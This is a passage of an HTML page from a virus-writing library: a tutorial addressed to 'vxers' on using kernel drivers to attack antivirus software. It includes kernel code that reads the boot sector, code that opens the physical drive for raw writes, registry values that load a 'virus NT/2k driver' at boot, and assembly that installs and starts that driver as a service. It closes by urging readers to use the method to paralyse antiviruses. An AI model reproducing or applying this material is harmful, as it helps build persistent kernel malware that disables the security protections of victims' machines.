+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Set completion routine to validate finishing request.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; IoSetCompletionRoutine<span style="color: black;">&#40;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; localIrp<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DiskLoadMBRSectorCompletion<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DeviceObject<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TRUE<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TRUE<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; TRUE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Set an event.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; KeInitializeEvent<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>event<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; NotificationEvent<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FALSE<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; status <span style="color: #339933;">=</span> IoCallDriver<span style="color: black;">&#40;</span>devExt<span style="color: #339933;">-&gt;</span>attachedDevice<span style="color: #339933;">,</span> localIrp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Set Irp stack frame to the next loweer one.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; localIrp<span style="color: #339933;">-&gt;</span>CurrentLocation<span style="color: #339933;">--;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; localIrp<span style="color: #339933;">-&gt;</span>Tail.<span style="color: #202020;">Overlay</span>.<span style="color: #202020;">CurrentStackLocation</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">=</span> IoGetNextIrpStackLocation<span style="color: black;">&#40;</span>localIrp<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Now &nbsp;we &nbsp;will &nbsp;wait &nbsp;100ms &nbsp;than &nbsp;IoCallDriver &nbsp;will &nbsp; return</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// STATUS_PENDING &nbsp;value. &nbsp;If &nbsp;you get this value, device hasn't</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// finished &nbsp;the &nbsp;request &nbsp;yet. This &nbsp;method is my own I haven't</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// think up any new one. Also &nbsp;I spoke with some &nbsp;developers and</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// they haven't used this yet.</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; offset.<span style="color: #202020;">LowPart</span><span style="color: #339933;">=</span><span style="color: #0000dd;">100</span><span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>status <span style="color: #339933;">==</span> STATUS_PENDING<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KeWaitForSingleObject<span style="color: black;">&#40;</span><span style="color: #339933;">&amp;</span>event<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Executive<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KernelMode<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;FALSE<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">&amp;</span>offset<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> localIrp<span style="color: #339933;">-&gt;</span>IoStatus.<span style="color: #202020;">Status</span><span style="color: #339933;">;</span><br/>
+&nbsp;</div></li>
+</ul>
+<h4><a name="p344"></a>3.4.4. How to load DOS &amp; VXD driver</h4>
+<p>At first I'd like to take to parts the DOS driver problem. There are exist two ways how something write to the zero track.</p>
+<ul>
+<li>To use standard device: works only when the user has admin rights
+<div class="c" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Open the device representing the first hard disk. &nbsp;This</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// call will fail if the user doesn't have sufficient rights</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hPhysicalDrive <span style="color: #339933;">=</span> CreateFile<span style="color: black;">&#40;</span><span style="color: #ff0000;">&quot;<span style="color: #000099; font-weight: bold;">\\</span><span style="color: #000099; font-weight: bold;">\\</span>.<span style="color: #000099; font-weight: bold;">\\</span>PhysicalDrive0&quot;</span><span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; GENERIC_READ <span style="color: #339933;">|</span> GENERIC_WRITE<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; FILE_SHARE_READ <span style="color: #339933;">|</span> FILE_SHARE_WRITE<span style="color: #339933;">,</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> OPEN_EXISTING<span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: #339933;">,</span> <span style="color: #0000dd;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">&#40;</span>hPhysicalDrive <span style="color: #339933;">!=</span> INVALID_HANDLE_VALUE<span style="color: black;">&#41;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;MBR data<span style="color: #339933;">;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DWORD dwBytesRead<span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">// Read sector 0 off of the drive...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ReadFile<span style="color: black;">&#40;</span>hPhysicalDrive<span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>data<span style="color: #339933;">,</span> <span style="color: #0000dd;">512</span><span style="color: #339933;">,</span> <span style="color: #339933;">&amp;</span>dwBytesRead<span style="color: #339933;">,</span> NULL<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;...<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">// Close the driver</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;CloseHandle<span style="color: black;">&#40;</span>hPhysicalDrive<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
+&nbsp;</div></li>
+<li>To use driver: you can dynamic load the driver (more below) and it'll use IoBuildSynchronousFsdRequest to read/write it. This manner is better because you can't know if the user is an administartor.</li>
+</ul>
+<p>So, we successfuly loaded the DOS driver and now we must do the same for VXD driver. This is easier but we must know if the user 's Win95/98 system or not. We have two ways to find it out:</p>
+<ul>
+<li>Compare typical Win9x directories, like: <tt>C:\Windows</tt>, <tt>C:\Win95</tt> or <tt>Win98</tt> etc...</li>
+<li>Create a thread which will search the disk step by step.</li>
+</ul>
+<h4><a name="p345"></a>3.4.5. Driver loading</h4>
+<p>I am tired of the repetition "there're two ways how to..." all the time of this tutorial but it's true.</p>
+<ul>
+<li>Update registers:
+<pre>
+	HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VX
+</pre>
+<p>where VX is the name of your directory in regs; so, create these lines there:</p>
+<pre>
+	"ImageePath"  ,REG_EXPAND_SZ,"Systeem32\DRIVERS\driver.sys"
+	"Description" ,REG_SZ       ,"The virus NT/2k driver."
+	"DisplayName" ,REG_SZ       ,"VX_SYS"
+	"ErrorControl",REG_DWORD    ,1
+	"Start"       ,REG_DWORD    ,1          ;boot loading
+	"Type"        ,REG_DWORD    ,1          ;kernel driver
+</pre>
+<p>So, after rebooting your driver will be loaded itself.</p></li>
+<li>Dynamic loading: This method automatically updates registers.
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">.386</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span>model &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">flat</span><span style="color: #339933;">,</span>stdcall<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; includelib c<span style="color: #339933;">:</span>\<span style="color: #339933;">...</span>\advapi32<span style="color: #339933;">.</span>lib<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn &nbsp; &nbsp; &nbsp; &nbsp; OpenSCManagerA<span style="color: #339933;">:</span>proc<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn &nbsp; &nbsp; &nbsp; &nbsp; CreateServiceA<span style="color: #339933;">:</span>proc<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn &nbsp; &nbsp; &nbsp; &nbsp; GetCurrentDirectoryA<span style="color: #339933;">:</span>proc<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn &nbsp; &nbsp; &nbsp; &nbsp; lstrcat<span style="color: #339933;">:</span>proc<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn &nbsp; &nbsp; &nbsp; &nbsp; CloseServiceHandle<span style="color: #339933;">:</span>proc<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn &nbsp; &nbsp; &nbsp; &nbsp; StartServiceA<span style="color: #339933;">:</span>proc<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; extrn &nbsp; &nbsp; &nbsp; &nbsp; DeleteService<span style="color: #339933;">:</span>proc<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">.data</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SC_MANAGER_ALL_ACCESS &nbsp;<span style="color: #0000ff; font-weight: bold;">EQU</span> STANDARD_RIGHTS_REQUIRED <span style="color: #00007f; font-weight: bold;">OR</span> <span style="color: #ff0000;">03FH</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SERVICE_ALL_ACCESS &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">EQU</span> STANDARD_RIGHTS_REQUIRED <span style="color: #00007f; font-weight: bold;">OR</span> <span style="color: #ff0000;">1FFH</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SERVICE_KERNEL_DRIVER &nbsp;<span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #ff0000;">001H</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SERVICE_DEMAND_START &nbsp; <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #ff0000;">003H</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SERVICE_ERROR_NORMAL &nbsp; <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #ff0000;">001H</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SERVICE_CONTROL_STOP &nbsp; <span style="color: #0000ff; font-weight: bold;">EQU</span> <span style="color: #ff0000;">001H</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DosDeviceName &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;\\.\&quot;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DriverName &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;driver.sys&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; _ServiceExe &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">&quot;\driver.sys&quot;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">.data</span>?<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; schSCManager &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> ?<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; schService &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dd</span> ?<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; path &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">260</span> dup<span style="color: black;">&#40;</span>?<span style="color: black;">&#41;</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">.</span><span style="color: #0000ff; font-weight: bold;">code</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">start</span><span style="color: #339933;">:</span><br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; get actual directory + the name of the driver</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; <span style="color: #ff0000;">260</span> offset path<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp; GetCurrentDirectoryA<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; offset path<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; offset _ServiceExe<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp; lstrcat<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; load the driver</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">esi</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #46aa03; font-weight: bold;">esi</span> SC_MANAGER_ALL_ACCESS<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp; OpenSCManagerA<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; &nbsp;schSCManager<span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> &nbsp; &nbsp; &nbsp; __failed<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; schSCManager<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; offset DriverName offset DriverName<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; SERVICE_ALL_ACCESS SERVICE_KERNEL_DRIVER \<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; SERVICE_DEMAND_START SERVICE_ERROR_NORMAL<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; offset path<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp; CreateServiceA<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; &nbsp;<span style="color: black;">&#91;</span>schService<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; &nbsp;<span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">jz</span> &nbsp; &nbsp; &nbsp; __close_SCM<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span> <span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #46aa03; font-weight: bold;">esi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp; StartServiceA<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #339933;">...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">push</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #00007f; font-weight: bold;">call</span> &nbsp; &nbsp; &nbsp; &nbsp; ExitProcess<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; end <span style="color: #0000ff; font-weight: bold;">start</span><br/>
+&nbsp;</div></li>
+</ul>
+<h3><a name="p35"></a>3.5. Debugging Drivers</h3>
+<p>For all vxers will be better use SoftICE, there is one my special advice for you:</p>
+<ul>
+<li>there, where you want to place a brekpoint, write: "<code>__asm int 4</code>" (C++ mode) or "<code>int 4</code>" (ASM mode)</li>
+<li>jump to SoftICE and write "bpint 4"</li>
+<li>run dynamicaly the driver</li>
+<li>SoftICE will stop the driver</li>
+<li>replace "<code>int 4</code>" instruction, with: "a (enter) nop (enter) nop (enter)" and if you want to SoftIce stop there in next time, write: "bpxeip"</li>
+</ul>
+<p>Some rich vxers who have two computers can use the 2nd one like a debugger, the exact instruction is in DDK 2k. You will need create only a serial cabel (show us your electrotechnic knowledge!).</p>
+<h2><a name="p4"></a>4. Conclusion</h2>
+<p>If I had possibility to write a virus sometimes in future, surely I would choose this method like 100%-ly attack againt antiviruses. For some vxers it can be hard to code but mainly "Files Encryption" would be easy to realize. In fine I wish you could instead all anti-* technics to use one quite certain way leading to the antiviruses paralysis.</p>
+[<a style="" href="/lib/?lang=EN&amp;index=WI#vpr00">Back to index</a>] [<a href="/lib/vpr00.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vpr00">de</a><a href="/lib/index.php?lang=en&amp;id=vpr00">en</a><a href="/lib/index.php?lang=es&amp;id=vpr00">es</a><a href="/lib/index.php?lang=it&amp;id=vpr00">it</a><a href="/lib/index.php?lang=fr&amp;id=vpr00">fr</a><a href="/lib/index.php?lang=pl&amp;id=vpr00">pl</a><a href="/lib/index.php?lang=ru&amp;id=vpr00">ru</a><a href="/lib/index.php?lang=ua&amp;id=vpr00">ua</a></div>
+</body>
+</html>
